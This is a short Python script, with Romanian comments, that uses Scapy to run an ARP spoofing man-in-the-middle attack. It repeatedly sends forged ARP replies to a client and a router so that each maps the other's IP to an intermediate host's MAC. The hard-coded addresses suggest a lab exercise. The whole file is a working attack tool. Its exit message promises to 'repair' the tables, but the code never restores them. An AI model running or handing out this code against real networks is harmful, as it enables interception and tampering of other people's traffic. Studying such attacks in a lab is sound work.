from scapy.all import ARP, send
import time

ip_router = "198.7.0.1"
ip_server = "198.7.0.3"    
mac_router = "56:9b:c7:c2:5a:22"
mac_middle = "fa:28:63:a6:8d:22"
ip_client = "172.7.0.2"
mac_client = "86:c7:cb:ae:1d:b3"
ip_router_client = "172.7.0.1"   # interfata routerului catre client
mac_router_client = "3a:1a:b9:b4:43:96"

def spoof_arp(target_ip, spoof_ip, target_mac, my_mac):
    pkt = ARP(
        op=2,                 # ARP reply
        pdst=target_ip,       # IP-ul tintei (ex: router)
        hwdst=target_mac,     # MAC-ul tintei (ex: router)
        psrc=spoof_ip,        # IP-ul pentru care „mintim”
        hwsrc=my_mac          # MAC-ul nostru (middle)
    )
    send(pkt, verbose=False)

if __name__ == "__main__":
    try:
        print("[*] incep ARP Spoofing complet... Ctrl+C pentru a opri si repara.")
        while True:
            # Otravim routerul: pentru IP-ul client spunem ca e la MAC middle
            spoof_arp(ip_router_client, ip_client, mac_router_client, mac_middle)
            # Otravim clientul: pentru IP-ul router spunem ca e la MAC middle
            spoof_arp(ip_client, ip_router_client, mac_client, mac_middle)
            print("[*] Trimis ARP spoofing catre client si router (pe ambele interfete)!")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Oprit ARP spoofing.")

